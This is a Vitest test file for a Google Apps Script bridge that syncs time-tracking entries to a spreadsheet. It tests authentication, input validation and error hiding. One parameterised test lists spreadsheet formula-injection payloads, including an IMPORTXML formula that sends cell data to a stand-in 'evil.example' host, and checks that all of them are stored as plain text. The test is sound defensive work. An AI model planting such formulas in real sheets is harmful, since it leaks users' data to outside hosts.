import { describe, expect, it } from 'vitest';
import { createBridge } from '../test/fakeAppsScript';
import { makeEntry } from '../test/factories';

const TOKEN = 'secret-token';

function wireEntry(overrides = {}) {
  const e = makeEntry(overrides);
  return { ...e, notes: e.notes ?? '' };
}

describe('Apps Script bridge: authentication', () => {
  it('doGet is a health check that never exposes sheet data', () => {
    const bridge = createBridge(TOKEN);
    bridge.post({ token: TOKEN, action: 'sync_entries', entries: [wireEntry()] });

    const res = bridge.get();
    expect(res).toEqual({ status: 'ok', message: expect.any(String), version: 2 });
    expect(JSON.stringify(res)).not.toContain('Entry');
  });

  it.each([
    ['missing token', { action: 'pull_entries' }],
    ['wrong token', { action: 'pull_entries', token: 'nope' }],
    ['non-string token', { action: 'pull_entries', token: 12345 }],
  ])('rejects requests with a %s', (_label, body) => {
    const bridge = createBridge(TOKEN);
    const res = bridge.post(body);
    expect(res.status).toBe('error');
    expect(res.code).toBe('unauthorized');
    expect(bridge.sheet()).toBeUndefined(); // nothing touched
  });

  it('refuses everything until a token has been configured', () => {
    const bridge = createBridge(null);
    const res = bridge.post({ action: 'ping', token: '' });
    expect(res.code).toBe('token_not_configured');
  });

  it('setupToken generates and stores a long random token', () => {
    const bridge = createBridge(null);
    const token = bridge.api.setupToken();
    expect(token.length).toBeGreaterThanOrEqual(60);
    expect(bridge.props.get('TOKEN')).toBe(token);
    expect(bridge.post({ action: 'ping', token }).status).toBe('success');
  });

  it('returns a generic error for malformed JSON', () => {
    const bridge = createBridge(TOKEN);
    const res = JSON.parse(bridge.api.doPost({ postData: { contents: '{not json' } }).content);
    expect(res).toEqual({ status: 'error', message: 'Invalid JSON payload' });
  });

  it('rejects unknown actions', () => {
    const bridge = createBridge(TOKEN);
    expect(bridge.post({ token: TOKEN, action: 'drop_tables' }).message).toBe('Unknown action');
  });
});

describe('Apps Script bridge: sync and pull', () => {
  it('creates the sheet with headers and round-trips entries with their real times', () => {
    const bridge = createBridge(TOKEN);
    const entry = wireEntry({
      id: 'retro-abc',
      title: 'Write tests',
      tags: ['dev', 'qa'],
      startTime: '2026-03-01T08:15:00.000Z',
      endTime: '2026-03-01T09:00:00.000Z',
      durationMinutes: 45,
      mode: 'retroactive',
      updatedAt: '2026-03-01T09:00:05.000Z',
    });

    const push = bridge.post({ token: TOKEN, action: 'sync_entries', entries: [entry] });
    expect(push).toMatchObject({ status: 'success', syncedIds: ['retro-abc'] });
    expect(bridge.sheet()!.rows[0]).toContain('Start (ISO)');
    expect(bridge.sheet()!.frozenRows).toBe(1);

    const pull = bridge.post({ token: TOKEN, action: 'pull_entries' });
    expect(pull.entries).toHaveLength(1);
    expect(pull.entries[0]).toMatchObject({
      id: 'retro-abc',
      title: 'Write tests',
      tags: ['dev', 'qa'],
      startTime: '2026-03-01T08:15:00.000Z',
      endTime: '2026-03-01T09:00:00.000Z',
      durationMinutes: 45,
      mode: 'retroactive',
      syncStatus: 'synced',
      updatedAt: '2026-03-01T09:00:05.000Z',
      deleted: false,
    });
  });

  it('updates existing rows instead of duplicating them, including tombstones', () => {
    const bridge = createBridge(TOKEN);
    const entry = wireEntry({ id: 'totem-1' });
    bridge.post({ token: TOKEN, action: 'sync_entries', entries: [entry] });
    bridge.post({
      token: TOKEN,
      action: 'sync_entries',
      entries: [{ ...entry, title: 'Renamed', deleted: true, updatedAt: '2026-02-01T00:00:00.000Z' }],
    });

    expect(bridge.sheet()!.rows).toHaveLength(2); // header + 1
    const [pulled] = bridge.post({ token: TOKEN, action: 'pull_entries' }).entries;
    expect(pulled).toMatchObject({ title: 'Renamed', deleted: true });
  });

  it.each(['=IMPORTXML("https://evil.example/?"&A1,"//a")', '+1+1', '-2+3', '@SUM(A1)', '\tTAB', "'quoted"])(
    'stores %j as literal text, never as a formula',
    payload => {
      const bridge = createBridge(TOKEN);
      bridge.post({
        token: TOKEN,
        action: 'sync_entries',
        entries: [wireEntry({ id: 'inj', title: payload, notes: payload, tags: [payload] })],
      });

      const row = bridge.sheet()!.rows[1];
      expect(row.some(cell => typeof cell === 'object' && cell !== null && 'formula' in cell)).toBe(false);
      const [pulled] = bridge.post({ token: TOKEN, action: 'pull_entries' }).entries;
      expect(pulled.title).toBe(payload);
      expect(pulled.notes).toBe(payload);
    }
  );

  it('skips invalid incoming entries and reports them', () => {
    const bridge = createBridge(TOKEN);
    const res = bridge.post({
      token: TOKEN,
      action: 'sync_entries',
      entries: [
        wireEntry({ id: 'good' }),
        wireEntry({ id: 'bad id with spaces' }),
        { ...wireEntry({ id: 'bad-class' }), classification: 'evil' },
        { ...wireEntry({ id: 'bad-date' }), startTime: 'yesterday-ish' },
        null,
      ],
    });
    expect(res.syncedIds).toEqual(['good']);
    expect(res.rejectedIds).toEqual(['bad id with spaces', 'bad-class', 'bad-date']);
  });

  it('caps the batch size', () => {
    const bridge = createBridge(TOKEN);
    const entries = Array.from({ length: 501 }, (_, i) => wireEntry({ id: `bulk-${i}` }));
    expect(bridge.post({ token: TOKEN, action: 'sync_entries', entries }).message).toMatch(/Too many/);
  });

  it('reads legacy v1 rows (11 columns) and upgrades the header', () => {
    const bridge = createBridge(TOKEN);
    bridge.post({ token: TOKEN, action: 'ping' }); // creates the sheet
    const s = bridge.sheet()!;
    s.rows = [
      s.rows[0].slice(0, 11),
      ['old-1', '1/1/2026', '09:00', '10:00', 60, 'Upkeep', 'Legacy row', 'a, b', 'live', '', new Date('2026-01-01T10:00:00Z')],
    ];

    const [pulled] = bridge.post({ token: TOKEN, action: 'pull_entries' }).entries;
    expect(pulled).toMatchObject({
      id: 'old-1',
      classification: 'upkeep',
      tags: ['a', 'b'],
      startTime: '2026-01-01T10:00:00.000Z',
      deleted: false,
    });
    expect(bridge.sheet()!.rows[0]).toHaveLength(15);
  });

  it('never leaks internal error details', () => {
    const bridge = createBridge(TOKEN);
    bridge.post({ token: TOKEN, action: 'ping' });
    bridge.sheet()!.getLastRow = () => {
      throw new Error('Service Spreadsheets failed: internal path /secret');
    };
    const res = bridge.post({ token: TOKEN, action: 'pull_entries' });
    expect(res).toEqual({ status: 'error', message: 'Internal error in Tiki-Toki bridge' });
  });
});
